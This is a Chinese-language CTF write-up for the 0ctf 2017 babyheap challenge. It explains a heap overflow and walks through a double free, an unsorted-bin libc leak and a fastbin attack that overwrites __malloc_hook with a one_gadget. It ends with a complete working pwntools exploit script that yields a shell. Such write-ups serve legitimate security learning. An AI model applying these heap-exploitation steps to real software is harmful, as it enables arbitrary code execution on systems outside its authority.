0ctf_2017_babyheap

2022-08-04 633 words

一道比较简单的堆题，但是因为一些比较nt的原因，导致做了很久才出shell

漏洞分析

首先编辑堆块的地方有一个很明显的堆溢出（输入字符串任意大小）

利用思路

1.通过堆溢出，来构成一个double free

2.通过double free来泄露unsorted bin指向的main_arena

3.利用fast bin attack来修改malloc_hook为one_gadget(寻找‘\x7f’作为fake_chunk的size位)

利用堆溢出，构造double free

add(0x10)#0
add(0x10)#1
add(0x10)#2
add(0x10)#3
add(0x80)#4
add(0x10)#5防止unsorted bin和topchunk合并

delete(1)
delete(2)
payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b'\x80'#修改fd指针指向chunk4
fill(0,len(payload),payload)
payload1=p64(0)*3+b'\x21'
fill(3,len(payload1),payload1)
add(0x10)#1
add(0x10)#2and4同时指向chunk4

利用double free泄露main_arena

payload2=p64(0)*3+b'\x91'
fill(3,len(payload2),payload2)#将chunk4的size修改回来
delete(4)
show(2)
malloc_hook=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-88-0x10
print("malloc_hook:"+hex(malloc_hook))
base=malloc_hook-libc.sym['__malloc_hook']
onegadget=base+0x4526a

利用fast bin attack修改malloc_hook

add(0x60)#4切割unsorted bin
delete(4)

payload3=p64(malloc_hook-0x8-0x2-0x8-1-0x10)#在malloc_hook的低地址处寻找‘/x7f’
fill(2,len(payload3),payload3)#利用double free的指针2修改fast bin的fd指针指向malloc_hook附近构造fake chunk
add(0x60)#4
add(0x60)#6
payload4=b'A'*(0x8+0x2+0x8+1)+p64(onegadget)
fill(6,len(payload4),payload4)
add(0x10)

io.interactive()

完整exp

from pwn import *
io=process("./0ctf_2017_babyheap")
#io=remote("node4.buuoj.cn",28039)
elf=ELF("./0ctf_2017_babyheap")
libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
#libc=ELF("./libc-2.23_64.so")

def dbg():
    gdb.attach(io)
    pause()

def add(size):
    io.recvuntil("Command: ")
    io.sendline(b'1')
    io.recvuntil("Size: ")
    io.sendline(str(size))

def fill(index,size,content):
    io.recvuntil("Command: ")
    io.sendline(b'2')
    io.recvuntil("Index: ")
    io.sendline(str(index))
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.recvuntil("Content: ")
    io.sendline(content)

def delete(index):
    io.recvuntil("Command: ")
    io.sendline(b'3')
    io.recvuntil("Index: ")
    io.sendline(str(index))

def show(index):
    io.recvuntil("Command: ")
    io.sendline(b'4')
    io.recvuntil("Index: ")
    io.sendline(str(index))

add(0x10)#0
add(0x10)#1
add(0x10)#2
add(0x10)#3
add(0x80)#4
add(0x10)#5

delete(1)
delete(2)
payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b'\x80'
fill(0,len(payload),payload)
payload1=p64(0)*3+b'\x21'
fill(3,len(payload1),payload1)
add(0x10)#1
add(0x10)#2and4
payload2=p64(0)*3+b'\x91'
fill(3,len(payload2),payload2)
delete(4)
show(2)
malloc_hook=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-88-0x10
print("malloc_hook:"+hex(malloc_hook))
base=malloc_hook-libc.sym['__malloc_hook']
onegadget=base+0x4526a
add(0x60)#4
delete(4)

payload3=p64(malloc_hook-0x8-0x2-0x8-1-0x10)
fill(2,len(payload3),payload3)
add(0x60)#4
add(0x60)#6
payload4=b'A'*(0x8+0x2+0x8+1)+p64(onegadget)
fill(6,len(payload4),payload4)
add(0x10)

io.interactive()
